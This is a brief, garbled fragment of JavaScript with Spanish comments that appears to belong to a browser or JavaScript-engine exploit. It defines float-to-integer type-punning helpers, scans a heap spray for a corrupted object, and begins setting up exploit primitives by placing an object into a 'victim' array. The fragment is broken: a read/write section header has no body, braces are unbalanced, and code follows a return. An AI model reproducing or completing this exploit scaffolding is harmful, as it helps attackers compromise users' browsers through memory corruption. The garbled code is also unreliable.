      // --- Funciones de conversión reales ---
      function ftoi(val) {
        f64[0] = val;
        return u32[0] + u32[1] * 0x100000000;
      }

      function itof(val) {
        u32[0] = val % 0x100000000;
        u32[1] = val / 0x100000000;
        return f64[0];
      }

      // --- Funciones RW reales ---

        if (spray[i][0].a !== 1) {
          corrupted = true;
          victim = spray[i];
          break;
        }
      }

      if (!corrupted) {
        log("[-] No se detectó corrupción.");
        return;

        log("[+] Corrupción detectada.");

      log("[*] Preparando primitivas...");

        victim[0] = obj;
